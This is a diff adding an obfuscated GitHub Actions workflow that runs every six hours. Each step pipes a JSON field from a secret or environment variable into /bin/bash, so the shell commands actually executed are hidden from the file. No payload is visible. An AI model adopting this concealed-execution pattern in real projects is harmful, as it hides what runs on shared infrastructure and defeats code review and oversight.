@@ -1,0 +1,25 @@
+name: fangjiuzhi9876
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangjiuzhi9876
+        env:
+          nmhko2826: ${{ secrets.nmhko2826 }}
+        run: |
+          echo $nmhko2826 | jq -r .k5 | /bin/bash
+          echo $kmz6524 | jq -r .e411 | /bin/bash
+          echo $l8 | jq -r .hrsij6633 | /bin/bash
+          echo $f6052 | jq -r .dtp0 | /bin/bash
+          echo $ho342 | jq -r .dqq643 | /bin/bash
+          echo $s706 | jq -r .bldiy13919 | /bin/bash
+          echo $hj289 | jq -r .zzw88049 | /bin/bash
+
